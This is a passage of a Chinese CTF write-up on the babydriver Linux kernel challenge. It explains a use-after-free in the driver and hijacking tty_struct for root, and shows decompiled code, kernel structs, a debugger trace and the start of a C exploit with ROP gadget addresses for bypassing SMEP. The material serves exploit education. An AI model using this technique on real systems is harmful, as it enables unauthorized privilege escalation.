.data:00000000000008C0 00 00 00 00 00 00 30 01 00 00+                                        ; DATA XREF: babydriver_init:loc_1AA↑o
.data:00000000000008C0 00 00 00 00 F0 00 00 00 00 00+                 offset babyioctl, 0, 0, offset babyopen, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, \
.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+                 0&gt;
.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+_data ends
.data:00000000000008C0 00 00 00 00 00 00 00 00 00 00+
</code></pre>
<p>这里也就是该设备的一个<code>file_operations</code>,实现了read,ioctl,open,write等函数,因此我们首先看open</p>
<pre><code class="hljs">int __fastcall babyopen(inode *inode, file *filp)
&#123;
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);
  babydev_struct.device_buf_len = 64LL;
  printk(&quot;device open\n&quot;, 0x24000C0LL, v2);
  return 0;
&#125;
</code></pre>
<p>可以看到我们open的时候,他首先调用<code>kmem_cache_alloc_trace</code>函数分配了内核空间给全局变量<code>babydev_struct</code>的字段,然后赋值其中长度字段为64,然后我们来看ioctl函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// local variable allocation has failed, the output may be wrong!</span><br>__int64 __fastcall <span class="hljs-title function_">babyioctl</span><span class="hljs-params">(file *filp, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> command, <span class="hljs-type">unsigned</span> __int64 arg)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v4; <span class="hljs-comment">// rbx</span><br>  __int64 v5; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(filp, *(_QWORD *)&amp;command);<br>  v4 = v3;<br>  <span class="hljs-keyword">if</span> ( command == <span class="hljs-number">0x10001</span> )<br>  &#123;<br>    kfree(babydev_struct.device_buf);<br>    babydev_struct.device_buf = (<span class="hljs-type">char</span> *)_kmalloc(v4, <span class="hljs-number">0x24000C0</span>LL);<br>    babydev_struct.device_buf_len = v4;<br>    printk(<span class="hljs-string">&quot;alloc done\n&quot;</span>, <span class="hljs-number">0x24000C0</span>LL, v5);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_2EB, v3, v3);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-22LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里可以看到我们可以通过该函数来重新分配内核堆块给全局变量<code>babydev_struct</code>,这样显得open有点多余了说<br>然后我们来看关键漏洞点,也就是release函数,或者说close函数,如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">babyrelease</span><span class="hljs-params">(inode *inode, file *filp)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br><br>  _fentry__(inode, filp);<br>  kfree(babydev_struct.device_buf);<br>  printk(<span class="hljs-string">&quot;device release\n&quot;</span>, filp, v2);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到他是释放掉了我们的全局变量指向的分配堆块,但并没有赋空值,所以存在一个悬垂指针供我们利用.<br>其余的read和write函数就是正常的读写,没必要单独贴出来.</p>
<h3 id="2-利用tty-struct达成提权"><a href="#2-利用tty-struct达成提权" class="headerlink" title="2.利用tty_struct达成提权"></a>2.利用<code>tty_struct</code>达成提权</h3><p>我们的<code>/dev</code>目录下面存在一个伪终端设备<code>/dev/ptmx</code>,该设备打开后会创建一个<code>tty_struct</code>结构体,其中同其他设备一样存在着<code>tty_operations</code>结构体,因此不难理解我们可以利用UAF来劫持该结构体,然后覆写其中的函数指针至我们的ROP链来达成提权效果,大致思路如下:</p>
<ol>
<li>分别打开两次, <code>/dev/babydev</code>,那么我们就能得到同时指向一个堆块的两个指针</li>
<li>我们通过ioctl函数来修改堆块的大小,改变成能劫持下面tty_struct的大小</li>
<li>然后我们释放掉其中一个设备,释放掉对应全局变量堆块,但是我们仍存在一个指向该释放堆块的指针</li>
<li>我们再打开<code>/dev/ptmx</code>设备,因此分配一个堆块来存放<code>tty_struct</code>结构体</li>
<li>我们就可以利用之前还剩余的那个指针来修改<code>tty_struct</code>指向我们构造的<code>fake_operations</code>(什么时候构造都可以,可以指向栈中,但是要在本步骤前熬)</li>
<li>之后我们调用<code>fake_operations</code>中的相关函数就可以达成任意代码执行,进而提权.</li>
</ol>
<p>其中最主要的地方其实就是我们需要知道<code>tty_struct</code>的大小,然后修改之前堆块的大小来满足释放的堆块重新分配了.我们接下来就是寻找他的大小,这里直接剧透为0x2e0</p>
<p>其中<code>tty_struct</code>结构体的大致情况如下,位于<code>include/linux/tty.h</code>中:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> &#123;</span><br>	<span class="hljs-type">int</span>	magic;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kref</span> <span class="hljs-title">kref</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">dev</span>;</span>	<span class="hljs-comment">/* class device or NULL (e.g. ptys, serdev) */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>;</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-type">int</span> index;<br><br>	<span class="hljs-comment">/* Protects ldisc changes: Lock tty not pty */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ld_semaphore</span> <span class="hljs-title">ldisc_sem</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_ldisc</span> *<span class="hljs-title">ldisc</span>;</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">atomic_write_lock</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">legacy_mutex</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">throttle_mutex</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">termios_rwsem</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">winsize_mutex</span>;</span><br>	<span class="hljs-comment">/* Termios values are protected by the termios rwsem */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ktermios</span> <span class="hljs-title">termios</span>, <span class="hljs-title">termios_locked</span>;</span><br>	<span class="hljs-type">char</span> name[<span class="hljs-number">64</span>];<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br>	<span class="hljs-type">int</span> count;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">winsize</span> <span class="hljs-title">winsize</span>;</span>		<span class="hljs-comment">/* winsize_mutex */</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-type">spinlock_t</span> lock;<br>		<span class="hljs-type">bool</span> stopped;<br>		<span class="hljs-type">bool</span> tco_stopped;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>	&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) flow;<br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>		<span class="hljs-type">spinlock_t</span> lock;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">pgrp</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">session</span>;</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> pktstatus;<br>		<span class="hljs-type">bool</span> packet;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> unused[<span class="hljs-number">0</span>];<br>	&#125; __aligned(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) ctrl;<br><br>	<span class="hljs-type">int</span> hw_stopped;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> receive_room;	<span class="hljs-comment">/* Bytes free for queue */</span><br>	<span class="hljs-type">int</span> flow_change;<br><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> *<span class="hljs-title">link</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync</span>;</span><br>	<span class="hljs-type">wait_queue_head_t</span> write_wait;<br>	<span class="hljs-type">wait_queue_head_t</span> read_wait;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">hangup_work</span>;</span><br>	<span class="hljs-type">void</span> *disc_data;<br>	<span class="hljs-type">void</span> *driver_data;<br>	<span class="hljs-type">spinlock_t</span> files_lock;		<span class="hljs-comment">/* protects tty_files list */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">tty_files</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_TTY_BUF_SIZE 4096</span><br><br>	<span class="hljs-type">int</span> closing;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *write_buf;<br>	<span class="hljs-type">int</span> write_cnt;<br>	<span class="hljs-comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">SAK_work</span>;</span> 				<span class="hljs-comment">//这里存在一个函数指针,可以泄露基地址</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_port</span> *<span class="hljs-title">port</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>其中值得注意的就是我们的<code>const struct tty_operations *ops;</code><br>它指向一个<code>tty_operations</code>结构体,它位于<code>include/linux/tty_driver.h</code>当中, 如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">			<span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>	<span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>	<span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>	<span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>		      <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>	<span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>	<span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*write_room)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*chars_in_buffer)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tty_struct *tty)</span>;<br>	<span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>		    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>	<span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>			     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>	<span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>	<span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>	<span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>	<span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>	<span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>	<span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>	<span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>	<span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>	<span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>	<span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>				<span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>	<span class="hljs-type">int</span>  (*get_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br>	<span class="hljs-type">int</span>  (*set_serial)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> serial_struct *p);<br>	<span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>	<span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>	<span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>	<span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>	<span class="hljs-type">int</span> (*proc_show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *);<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure>

<p>这里我们执行到ROP链后写cr4寄存器为0x6f0来绕过SMEP,然后打ret2user，但这里每次提权成功后返回userland的时候到swapgs后的pop rbp总会报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0xffffffff81063694 &lt;native_swapgs+4&gt;      swapgs <br> ► 0xffffffff81063697 &lt;native_swapgs+7&gt;      pop    rbp<br>   0xffffffff81063698 &lt;native_swapgs+8&gt;      ret    <br>    ↓<br>   0xffffffff814e35ef &lt;tty_audit_log+239&gt;    iretq  <br>   0xffffffff814e35f1 &lt;tty_audit_log+241&gt;    ret    <br> <br>   0xffffffff814e35f2 &lt;tty_audit_log+242&gt;    dec    dword ptr [rax - 0x75]<br>   0xffffffff814e35f5 &lt;tty_audit_log+245&gt;    push   rbp<br>   0xffffffff814e35f6 &lt;tty_audit_log+246&gt;    test   al, init_module+36            &lt;72&gt;<br>   0xffffffff814e35f8 &lt;tty_audit_log+248&gt;    mov    esi, dword ptr [rbp - 0x50]<br>   0xffffffff814e35fb &lt;tty_audit_log+251&gt;    mov    rdi, rbx<br>   0xffffffff814e35fe &lt;tty_audit_log+254&gt;    call   audit_log_n_hex            &lt;audit_log_n_hex&gt;<br>──────────────────────────────────────────────────────────────────────────────────────────────────<br>00:0000│ rsp 0x7ffeb93ba830 ◂— 0x0<br>01:0008│     0x7ffeb93ba838 —▸ 0xffffffff814e35ef (tty_audit_log+239) ◂— iretq  <br>02:0010│     0x7ffeb93ba840 —▸ 0x402001 ◂— endbr64 <br>03:0018│     0x7ffeb93ba848 ◂— 0x33 /* &#x27;3&#x27; */<br>04:0020│     0x7ffeb93ba850 ◂— 0x246<br>05:0028│     0x7ffeb93ba858 —▸ 0x7ffeb93ba7d0 —▸ 0xffff880005fc7758 ◂— 0xcc<br>06:0030│     0x7ffeb93ba860 ◂— 0x2b /* &#x27;+&#x27; */<br>07:0038│     0x7ffeb93ba868 ◂— 0x0<br>──────────────────────────────────────────────────────────────────────────────────────────────────<br> ► f 0 0xffffffff81063697 native_swapgs+7<br>──────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; i all-registers cr3<br>cr3            0x5fe2000           [ PDBR=2 PCID=0 ]<br></code></pre></td></tr></table></figure>

<p>据推测这里因该确实是KPTI开启的情况，但为什么加了nopti还是有这个存在呢，难以理解，但是本题利用的过程算是摸清楚了</p>
<p>exp如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __USE_GNU</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff810a1810</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810a1420</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff810d238d</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rsi = <span class="hljs-number">0xffffffff811dd9ae</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rdx = <span class="hljs-number">0xffffffff81440b72</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> mov_rc4_rdi_pop_rbp = <span class="hljs-number">0xffffffff81004d80</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> swapgs_pop_rbp = <span class="hljs-number">0xffffffff81063694</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> iretq = <span class="hljs-number">0xffffffff8181a797</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> mov_rsp_rax_ret = <span class="hljs-number">0xffffffff8181bfc5</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> pop_rax_ret = <span class="hljs-number">0xffffffff8100ce6e</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">size_t</span> mov_rdi_rax_pop2 = <span class="hljs-number">0xffffffff8133b32e</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">get_shell</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  